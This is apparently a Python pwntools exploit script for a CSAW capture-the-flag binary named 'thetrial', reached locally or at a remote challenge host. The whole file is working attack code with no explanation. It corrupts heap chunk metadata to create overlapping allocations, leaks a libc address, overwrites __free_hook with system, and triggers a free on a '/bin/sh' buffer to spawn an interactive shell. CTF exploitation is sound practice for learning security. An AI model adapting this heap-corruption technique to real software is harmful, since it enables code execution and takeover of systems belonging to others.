from pwn import *

e = ELF("./thetrial")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("red.chal.csaw.io", 5012)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

def free(idx):
  p.sendlineafter(">", "3")
  p.sendlineafter(">", str(idx))

p.sendlineafter(">", "2")
p.sendlineafter(">", "0")
p.sendlineafter(">", "0")

for i in range(8):
  p.sendlineafter(">", "2")
  p.sendlineafter(">", str(i + 17))
  p.sendlineafter(">", str(i + 17))


i8 = 17
i400 = 24

def alloc(idx):
  p.sendlineafter(">", "2")
  p.sendlineafter(">", str(i8))
  p.sendlineafter(">", str(idx))

def edit(idx, val):
  p.sendlineafter(">", "4")
  p.sendlineafter(">", str(idx))
  p.sendafter(":", val)

  p.recvuntil("updated.")

alloc(i400)

free(i400 + 2)

alloc(i400 + 1) # i400 + 2
alloc(i400 - 1)

alloc(i400) # i400 + 4
edit(i400 + 4, (p64(0x1337) + p64(0x1337)).ljust(0x400, "\x00") + p64(0x410 + 0x20 + 0x810))

edit(i400 + 2, "A" * 0x7f8 + p64(0x31))

debug()
free(i400 + 1)
free(i400 + 2)

alloc(i8)

p.sendlineafter(">", "2")
p.sendlineafter(">", str(i400))
p.sendlineafter(">", str(i400))

p.sendlineafter(">", "4")
p.sendlineafter(">", "28")
p.recvuntil("Old name: ")
leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x7fe15f35dca0 + 0x00007fe15ef72000
p.sendlineafter(":", "AAAA")

print(hex(leak))

edit(26, "/bin/sh\x00".ljust(0x7f0, "\x00") + p64(0x100) + p64(leak + libc.symbols["__free_hook"]))
edit(25, p64(leak + libc.symbols["system"]))

p.sendlineafter(">", "3")
p.sendlineafter(">", "26")



p.interactive()
